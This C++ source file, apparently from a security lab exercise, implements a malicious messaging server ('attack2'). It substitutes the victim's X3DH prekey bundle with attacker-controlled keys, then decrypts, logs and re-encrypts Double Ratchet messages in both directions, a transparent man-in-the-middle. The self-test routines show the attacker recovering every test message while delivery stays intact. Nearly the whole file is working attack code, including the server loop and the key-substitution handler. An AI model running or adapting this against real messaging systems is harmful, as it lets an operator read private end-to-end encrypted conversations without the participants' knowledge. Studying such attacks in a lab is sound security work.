        x3dh_respond(ik_dh_A, ek_A, opk_id, sk_AM);

        if (!g_fmt_known) {                       // discover the AD convention once
            uint8_t mk0[32]; std::string pt0;
            first_recv_mk(sk_AM, M_spk.pub, M_spk.priv, dh_A, mk0);
            if (!discover_ad(mk0, ctv, ik_dh_A, ik_sig_A, dh_b64, pn, n, header, pt0)) {
                std::fprintf(stderr, "[attack2] DECRYPT FAILED — no AD variant matched\n");
                return "";
            }
        }
        init_receiver(g_AM, sk_AM, M_spk.pub, M_spk.priv,
                      build_prefix_ad(g_pmode, ik_dh_A, ik_sig_A, M_ik.pub, M_ik_sig));
        g_AM_up = true;
    }

    std::string pt;
    if (!ratchet_decrypt(g_AM, dh_A, pn, n, dh_b64, ctv.data(), ctv.size(), pt)) {
        std::fprintf(stderr, "[attack2] A->B ratchet_decrypt failed (n=%ld)\n", n);
        return "";
    }
    std::printf("[attack2]  %s -> %s  #%ld : \"%s\"\n",
                g_initiator.c_str(), g_victim.c_str(), ++g_n_AtoB, pt.c_str());
    std::fflush(stdout);

    if (!g_MB_up) {                               // open Mallory's session to the real Bob
        if (!g_victim_bundle_seen) { std::fprintf(stderr, "[attack2] victim bundle unknown\n"); return ""; }
        uint8_t ek_pub[32], ek_priv[32], sk_MB[32];
        x3dh_initiate_to_victim(ek_pub, ek_priv, sk_MB);
        init_sender(g_MB, sk_MB, g_victim_spk,
                    build_prefix_ad(g_pmode, M_ik.pub, M_ik_sig, g_victim_ik_dh, g_victim_ik_sig));
        g_init_block_MB =
            "\"init\":{\"ik_sig\":\"" + b64_encode(M_ik_sig, 32) + "\","
            "\"ik_dh\":\""  + b64_encode(M_ik.pub, 32) + "\","
            "\"ek\":\""     + b64_encode(ek_pub, 32) + "\","
            "\"opk_id\":0}";
        g_MB_up = true;
    }

    std::string odh; long opn, on; std::vector<uint8_t> oct;
    ratchet_encrypt(g_MB, pt, odh, opn, on, oct);
    std::string hdr = "{\"dh\":\"" + odh + "\",\"pn\":" + std::to_string(opn) +
                      ",\"n\":" + std::to_string(on);
    if (!g_init_block_MB.empty()) { hdr += "," + g_init_block_MB; g_init_block_MB.clear(); }
    hdr += "}";
    return "{\"from\":\"" + g_initiator + "\",\"to\":\"" + g_victim + "\",\"header\":" + hdr +
           ",\"ct\":\"" + b64_encode(oct.data(), oct.size()) + "\"}";
}

// Bob -> Alice : recover plaintext on g_MB, re-encrypt on g_AM, forward to Alice.
static std::string relay_B_to_A(const std::string& frame) {
    if (!g_MB_up || !g_AM_up) { std::fprintf(stderr, "[attack2] B->A before session is up\n"); return ""; }
    std::string header = j_obj(frame, "header");
    std::string dh_b64 = j_str(header, "dh");
    long pn = j_int(header, "pn", 0), n = j_int(header, "n", 0);
    uint8_t dh_B[32];
    if (!decode32(dh_b64, dh_B)) { std::fprintf(stderr, "[attack2] B->A dh parse fail\n"); return ""; }
    auto ctv = b64_decode(j_str(frame, "ct"));

    std::string pt;
    if (!ratchet_decrypt(g_MB, dh_B, pn, n, dh_b64, ctv.data(), ctv.size(), pt)) {
        std::fprintf(stderr, "[attack2] B->A ratchet_decrypt failed (n=%ld)\n", n);
        return "";
    }
    std::printf("[attack2]  %s -> %s  #%ld : \"%s\"\n",
                g_victim.c_str(), g_initiator.c_str(), ++g_n_BtoA, pt.c_str());
    std::fflush(stdout);

    std::string odh; long opn, on; std::vector<uint8_t> oct;
    ratchet_encrypt(g_AM, pt, odh, opn, on, oct);
    std::string hdr = "{\"dh\":\"" + odh + "\",\"pn\":" + std::to_string(opn) +
                      ",\"n\":" + std::to_string(on) + "}";
    return "{\"from\":\"" + g_victim + "\",\"to\":\"" + g_initiator + "\",\"header\":" + hdr +
           ",\"ct\":\"" + b64_encode(oct.data(), oct.size()) + "\"}";
}

// ---------------------------------------------------------------------------
// Self-test: simulate a genuine Alice (initiator) and Bob (responder) using the
// same primitives, and verify (a) Mallory recovers Alice's plaintext and
// (b) the re-encrypted frame decrypts cleanly on the real Bob. This validates
// the crypto plumbing and the serialize/AD layout WITHOUT needing the lab; the
// only thing the live run then checks is byte-compatibility with the Go client.
// ---------------------------------------------------------------------------
static int run_selftest() {
    std::printf("[selftest] simulating Alice -> (Mallory) -> Bob ...\n");

    // Real victim (Bob) identity + signed prekey, published to the server.
    KeyPair B_ik, B_spk;
    x25519_keygen(B_ik.pub, B_ik.priv);
    x25519_keygen(B_spk.pub, B_spk.priv);
    memcpy(g_victim_ik_dh, B_ik.pub, 32);
    memcpy(g_victim_spk,   B_spk.pub, 32);
    g_victim_bundle_seen = true;
    g_mitm_done = false;

    // Alice fetches "bob" and gets Mallory's substituted bundle (M_* keys).
    KeyPair A_ik, A_ek;
    x25519_keygen(A_ik.pub, A_ik.priv);
    x25519_keygen(A_ek.pub, A_ek.priv);

    // x3dh_initiate against Mallory's keys.
    uint8_t d1[32], d2[32], d3[32], d4[32];
    x25519_dh(A_ik.priv, M_spk.pub, d1);
    x25519_dh(A_ek.priv, M_ik.pub,  d2);
    x25519_dh(A_ek.priv, M_spk.pub, d3);
    x25519_dh(A_ek.priv, M_opk.pub, d4);     // opk_id = 1
    std::vector<uint8_t> ikm(32, 0xFF);
    ikm.insert(ikm.end(), d1, d1 + 32);
    ikm.insert(ikm.end(), d2, d2 + 32);
    ikm.insert(ikm.end(), d3, d3 + 32);
    ikm.insert(ikm.end(), d4, d4 + 32);
    uint8_t zeros[32] = {0}, sk[32];
    hkdf_sha256(zeros, 32, ikm.data(), ikm.size(), "AS3_X3DH", 8, sk, 32);
    std::string ad;
    ad.append((char*)A_ik.pub, 32);
    ad.append((char*)M_ik.pub, 32);

    Ratchet stA;
    init_sender(stA, sk, M_spk.pub, ad);
    const std::string secret = "Hello, Bob what are you doing?";
    std::string dh_b64; long pn, n; std::vector<uint8_t> ct;
    ratchet_encrypt(stA, secret, dh_b64, pn, n, ct);

    std::string init =
        "{\"ik_sig\":\"" + b64_encode(A_ik.pub, 32) + "\","    // (bogus sig, not verified)
        "\"ik_dh\":\""  + b64_encode(A_ik.pub, 32) + "\","
        "\"ek\":\""     + b64_encode(A_ek.pub, 32) + "\","
        "\"opk_id\":1}";
    std::string frame =
        "{\"from\":\"" + g_initiator + "\",\"to\":\"" + g_victim + "\",\"header\":{\"dh\":\"" +
        dh_b64 + "\",\"pn\":" + std::to_string(pn) + ",\"n\":" + std::to_string(n) +
        ",\"init\":" + init + "},\"ct\":\"" + b64_encode(ct.data(), ct.size()) + "\"}";

    // Mallory processes it: recover + re-encrypt toward Bob.
    std::string fwd = mitm_first_frame(frame);
    if (fwd.empty()) { std::printf("[selftest] FAIL: no forwarded frame\n"); return 1; }

    // Real Bob runs x3dh_respond on the forwarded frame and decrypts.
    std::string hdr = j_obj(fwd, "header"), bi = j_obj(hdr, "init");
    uint8_t mik[32], mek[32], mdh[32];
    decode32(j_str(bi, "ik_dh"), mik);
    decode32(j_str(bi, "ek"), mek);
    std::string fdh = j_str(hdr, "dh");
    decode32(fdh, mdh);
    long fpn = j_int(hdr, "pn", 0), fn = j_int(hdr, "n", 0);
    auto fct = b64_decode(j_str(fwd, "ct"));
    uint8_t b1[32], b2[32], b3[32];
    x25519_dh(B_spk.priv, mik, b1);
    x25519_dh(B_ik.priv,  mek, b2);
    x25519_dh(B_spk.priv, mek, b3);
    std::vector<uint8_t> ikm2(32, 0xFF);
    ikm2.insert(ikm2.end(), b1, b1 + 32);
    ikm2.insert(ikm2.end(), b2, b2 + 32);
    ikm2.insert(ikm2.end(), b3, b3 + 32);
    uint8_t skB[32];
    hkdf_sha256(zeros, 32, ikm2.data(), ikm2.size(), "AS3_X3DH", 8, skB, 32);
    std::string adB;
    adB.append((char*)mik, 32);
    adB.append((char*)B_ik.pub, 32);
    Ratchet stB;
    init_receiver(stB, skB, B_spk.pub, B_spk.priv, adB);
    std::string got;
    bool ok = ratchet_decrypt(stB, mdh, fpn, fn, fdh, fct.data(), fct.size(), got);

    std::printf("[selftest] Bob decrypted: ok=%d  text=\"%s\"\n", ok, got.c_str());
    if (ok && got == secret) {
        std::printf("[selftest] PASS — plaintext recovered by Mallory AND delivered to Bob.\n");
        return 0;
    }
    std::printf("[selftest] FAIL — mismatch.\n");
    return 1;
}

// Phase 3 bidirectional self-test: drive a genuine Alice and Bob through the
// SAME relay_A_to_B / relay_B_to_A paths the live server uses, over several
// messages in both directions (including each party's DH-ratchet turn), and
// verify every plaintext is recovered by Mallory AND decrypts on the far peer.
static int run_selftest_full() {
    std::printf("[selftest-full] bidirectional Alice <-> (Mallory) <-> Bob ...\n");
    uint8_t zeros[32] = {0};

    // Reset Phase 3 session state.
    g_AM_up = g_MB_up = false; g_init_block_MB.clear();
    g_n_AtoB = g_n_BtoA = 0; g_fmt_known = false;

    // Real Bob (victim) bundle, "published" to the server.
    KeyPair B_ik, B_spk;
    x25519_keygen(B_ik.pub, B_ik.priv);
    x25519_keygen(B_spk.pub, B_spk.priv);
    memcpy(g_victim_ik_dh, B_ik.pub, 32);
    memcpy(g_victim_spk,   B_spk.pub, 32);
    memset(g_victim_ik_sig, 0, 32);
    g_victim_bundle_seen = true;

    // Genuine Alice performs X3DH against Mallory's substituted bundle (M_*).
    KeyPair A_ik, A_ek;
    x25519_keygen(A_ik.pub, A_ik.priv);
    x25519_keygen(A_ek.pub, A_ek.priv);
    uint8_t d1[32], d2[32], d3[32], d4[32];
    x25519_dh(A_ik.priv, M_spk.pub, d1);
    x25519_dh(A_ek.priv, M_ik.pub,  d2);
    x25519_dh(A_ek.priv, M_spk.pub, d3);
    x25519_dh(A_ek.priv, M_opk.pub, d4);            // opk_id = 1
    std::vector<uint8_t> ikmA(32, 0xFF);
    ikmA.insert(ikmA.end(), d1, d1 + 32);
    ikmA.insert(ikmA.end(), d2, d2 + 32);
    ikmA.insert(ikmA.end(), d3, d3 + 32);
    ikmA.insert(ikmA.end(), d4, d4 + 32);
    uint8_t skA[32];
    hkdf_sha256(zeros, 32, ikmA.data(), ikmA.size(), "AS3_X3DH", 8, skA, 32);
    std::string adA; adA.append((char*)A_ik.pub, 32); adA.append((char*)M_ik.pub, 32);

    Ratchet stA; init_sender(stA, skA, M_spk.pub, adA);
    std::string a_init =
        "{\"ik_sig\":\"" + b64_encode(A_ik.pub, 32) + "\",\"ik_dh\":\"" + b64_encode(A_ik.pub, 32) +
        "\",\"ek\":\"" + b64_encode(A_ek.pub, 32) + "\",\"opk_id\":1}";

    Ratchet stB; bool stB_up = false;             // genuine Bob, set up on his first receive
    int fails = 0;

    auto alice_send = [&](const std::string& msg, bool first) {
        std::string dh; long pn, n; std::vector<uint8_t> ct;
        ratchet_encrypt(stA, msg, dh, pn, n, ct);
        std::string h = "{\"dh\":\"" + dh + "\",\"pn\":" + std::to_string(pn) +
                        ",\"n\":" + std::to_string(n) + (first ? ",\"init\":" + a_init : "") + "}";
        return "{\"from\":\"" + g_initiator + "\",\"to\":\"" + g_victim + "\",\"header\":" + h +
               ",\"ct\":\"" + b64_encode(ct.data(), ct.size()) + "\"}";
    };
    auto bob_recv = [&](const std::string& fwd, const std::string& expect) {
        std::string h = j_obj(fwd, "header");
        uint8_t dh[32]; decode32(j_str(h, "dh"), dh);
        long pn = j_int(h, "pn", 0), n = j_int(h, "n", 0);
        auto ct = b64_decode(j_str(fwd, "ct"));
        if (!stB_up) {                             // first frame from Mallory carries init
            std::string bi = j_obj(h, "init");
            uint8_t mik[32], mek[32];
            decode32(j_str(bi, "ik_dh"), mik); decode32(j_str(bi, "ek"), mek);
            uint8_t b1[32], b2[32], b3[32];
            x25519_dh(B_spk.priv, mik, b1);
            x25519_dh(B_ik.priv,  mek, b2);
            x25519_dh(B_spk.priv, mek, b3);
            std::vector<uint8_t> ik(32, 0xFF);
            ik.insert(ik.end(), b1, b1 + 32); ik.insert(ik.end(), b2, b2 + 32); ik.insert(ik.end(), b3, b3 + 32);
            uint8_t skB[32]; hkdf_sha256(zeros, 32, ik.data(), ik.size(), "AS3_X3DH", 8, skB, 32);
            std::string adB; adB.append((char*)mik, 32); adB.append((char*)B_ik.pub, 32);
            init_receiver(stB, skB, B_spk.pub, B_spk.priv, adB);
            stB_up = true;
        }
        std::string got;
        bool ok = ratchet_decrypt(stB, dh, pn, n, j_str(h, "dh"), ct.data(), ct.size(), got);
        if (!ok || got != expect) { std::printf("[selftest-full] FAIL Bob recv: ok=%d \"%s\"\n", ok, got.c_str()); fails++; }
    };
    auto bob_send = [&](const std::string& msg) {
        std::string dh; long pn, n; std::vector<uint8_t> ct;
        ratchet_encrypt(stB, msg, dh, pn, n, ct);
        std::string h = "{\"dh\":\"" + dh + "\",\"pn\":" + std::to_string(pn) + ",\"n\":" + std::to_string(n) + "}";
        return "{\"from\":\"" + g_victim + "\",\"to\":\"" + g_initiator + "\",\"header\":" + h +
               ",\"ct\":\"" + b64_encode(ct.data(), ct.size()) + "\"}";
    };
    auto alice_recv = [&](const std::string& fwd, const std::string& expect) {
        std::string h = j_obj(fwd, "header");
        uint8_t dh[32]; decode32(j_str(h, "dh"), dh);
        long pn = j_int(h, "pn", 0), n = j_int(h, "n", 0);
        auto ct = b64_decode(j_str(fwd, "ct"));
        std::string got;
        bool ok = ratchet_decrypt(stA, dh, pn, n, j_str(h, "dh"), ct.data(), ct.size(), got);
        if (!ok || got != expect) { std::printf("[selftest-full] FAIL Alice recv: ok=%d \"%s\"\n", ok, got.c_str()); fails++; }
    };

    // A->B, A->B, B->A, B->A, A->B, B->A : exercises both chains + DH-ratchet turns.
    struct Step { bool a2b; const char* msg; };
    const Step steps[] = {
        {true,  "msg1: hi bob"},
        {true,  "msg2: still alice"},
        {false, "msg3: hey alice (bob)"},
        {false, "msg4: bob again"},
        {true,  "msg5: alice after ratchet"},
        {false, "msg6: bob final"},
    };
    bool first_a2b = true;
    for (const Step& s : steps) {
        if (s.a2b) {
            std::string fwd = relay_A_to_B(alice_send(s.msg, first_a2b));
            first_a2b = false;
            if (fwd.empty()) { std::printf("[selftest-full] FAIL: relay_A_to_B dropped\n"); return 1; }
            bob_recv(fwd, s.msg);
        } else {
            std::string fwd = relay_B_to_A(bob_send(s.msg));
            if (fwd.empty()) { std::printf("[selftest-full] FAIL: relay_B_to_A dropped\n"); return 1; }
            alice_recv(fwd, s.msg);
        }
    }

    if (fails == 0) {
        std::printf("[selftest-full] PASS — %ld A->B and %ld B->A messages recovered by "
                    "Mallory and delivered intact.\n", g_n_AtoB, g_n_BtoA);
        return 0;
    }
    std::printf("[selftest-full] FAIL — %d mismatch(es).\n", fails);
    return 1;
}

// ---------------------------------------------------------------------------
// Per-connection handling
// ---------------------------------------------------------------------------
static bool send_line(int fd, const std::string& s) {
    std::string out = s; out.push_back('\n');
    size_t off = 0;
    while (off < out.size()) {
        ssize_t w = send(fd, out.data() + off, out.size() - off, 0);
        if (w <= 0) return false;
        off += (size_t)w;
    }
    return true;
}

static void handle_request(int fd, const std::string& line, std::string& who) {
    std::string type = j_str(line, "type");

    if (type == "register") {
        who = j_str(line, "user");
        if (g_verbose) std::fprintf(stderr, "[attack2] register: %s\n", who.c_str());
        send_line(fd, "{\"type\":\"ok\",\"ok\":true}");

    } else if (type == "publish") {
        std::string user = j_str(line, "user");
        std::string bundle = j_obj(line, "bundle");
        std::lock_guard<std::mutex> lk(g_mu);
        g_bundles[user] = bundle;
        if (user == g_victim) {
            decode32(j_str(bundle, "ik_dh"), g_victim_ik_dh);
            decode32(j_str(bundle, "spk"), g_victim_spk);
            decode32(j_str(bundle, "ik_sig"), g_victim_ik_sig);
            g_victim_bundle_seen = true;
            std::fprintf(stderr, "[attack2] stored REAL %s bundle (for forwarding)\n", user.c_str());
        }
        send_line(fd, "{\"type\":\"ok\",\"ok\":true,\"count\":5}");

    } else if (type == "fetch_bundle") {
        std::string user = j_str(line, "user");
        std::string bundle;
        {
            std::lock_guard<std::mutex> lk(g_mu);
            if (user == g_victim) {
                bundle = mallory_bundle_for(user);          // <-- key substitution
                std::fprintf(stderr, "[attack2] SUBSTITUTED bundle served for %s\n", user.c_str());
            } else if (g_bundles.count(user)) {
                bundle = g_bundles[user];
            }
        }
        if (bundle.empty())
            send_line(fd, "{\"type\":\"err\",\"err\":\"no such user\"}");
        else
            send_line(fd, "{\"type\":\"bundle\",\"bundle\":" + bundle + ",\"count\":4}");

    } else if (type == "send") {
        std::string frame = j_obj(line, "frame");
        std::string from = j_str(frame, "from"), to = j_str(frame, "to");
        bool handled = false;
        {
            std::lock_guard<std::mutex> lk(g_mu);
            if (g_full_mitm) {
                std::string out;
                if (from == g_initiator && to == g_victim)      out = relay_A_to_B(frame);
                else if (from == g_victim && to == g_initiator) out = relay_B_to_A(frame);
                if (!out.empty()) { g_mailbox[to].push_back(out); handled = true; }
            } else if (!g_mitm_done && from == g_initiator && to == g_victim) {
                std::string out = mitm_first_frame(frame);   // Phase 2 single-shot
                if (!out.empty()) { g_mailbox[g_victim].push_back(out); g_mitm_done = true; handled = true; }
            }
            if (!handled) g_mailbox[to].push_back(frame);    // pass-through
        }
        send_line(fd, "{\"type\":\"ok\",\"ok\":true}");

    } else if (type == "poll") {
        std::string user = j_str(line, "user");
        std::string frames;
        {
            std::lock_guard<std::mutex> lk(g_mu);
            auto& q = g_mailbox[user];
            for (size_t i = 0; i < q.size(); ++i) { if (i) frames += ","; frames += q[i]; }
            q.clear();
        }
        send_line(fd, "{\"type\":\"frames\",\"frames\":[" + frames + "]}");

    } else {
        send_line(fd, "{\"type\":\"err\",\"err\":\"unknown type\"}");
    }
}

static void handle_conn(int fd) {
    std::string buf, who;
    for (;;) {
        size_t nl;
        while ((nl = buf.find('\n')) == std::string::npos) {
            char data[4096];
            ssize_t n = recv(fd, data, sizeof(data), 0);
            if (n <= 0) { close(fd); return; }
            buf.append(data, n);
        }
        std::string line = buf.substr(0, nl);
        buf.erase(0, nl + 1);
        if (!line.empty()) handle_request(fd, line, who);
    }
}

int main(int argc, char** argv) {
    for (int i = 1; i < argc; ++i) {
        if (!std::strcmp(argv[i], "--port") && i + 1 < argc) g_port = std::atoi(argv[++i]);
        else if (!std::strcmp(argv[i], "--victim") && i + 1 < argc) g_victim = argv[++i];
        else if (!std::strcmp(argv[i], "--initiator") && i + 1 < argc) g_initiator = argv[++i];
        else if (!std::strcmp(argv[i], "-v")) g_verbose = true;
        else if (!std::strcmp(argv[i], "--phase2")) g_full_mitm = false;   // single-shot (Phase 2 demo)
        else if (!std::strcmp(argv[i], "--selftest")) { gen_mallory_keys(); return run_selftest(); }
        else if (!std::strcmp(argv[i], "--selftest-full")) { gen_mallory_keys(); return run_selftest_full(); }
    }
    gen_mallory_keys();

    int srv = socket(AF_INET, SOCK_STREAM, 0);
    int yes = 1;
    setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(yes));
    sockaddr_in a{};
    a.sin_family = AF_INET; a.sin_addr.s_addr = INADDR_ANY; a.sin_port = htons(g_port);
    if (bind(srv, (sockaddr*)&a, sizeof(a)) < 0) DIE("bind");
    if (listen(srv, 16) < 0) DIE("listen");

    std::printf("[attack2] MALICIOUS SERVER on :%d  victim=%s initiator=%s  mode=%s\n",
                g_port, g_victim.c_str(), g_initiator.c_str(),
                g_full_mitm ? "PHASE3 full bidirectional MITM" : "PHASE2 single-shot");
    if (g_full_mitm)
        std::printf("[attack2] substituting %s's bundle; relaying BOTH directions, reading "
                    "the whole conversation.\n\n", g_victim.c_str());
    else
        std::printf("[attack2] substituting %s's bundle; decrypting %s's FIRST message "
                    "and forwarding transparently.\n\n", g_victim.c_str(), g_initiator.c_str());
    std::fflush(stdout);

    for (;;) {
        int fd = accept(srv, nullptr, nullptr);
        if (fd < 0) continue;
        std::thread(handle_conn, fd).detach();
    }
    return 0;
}
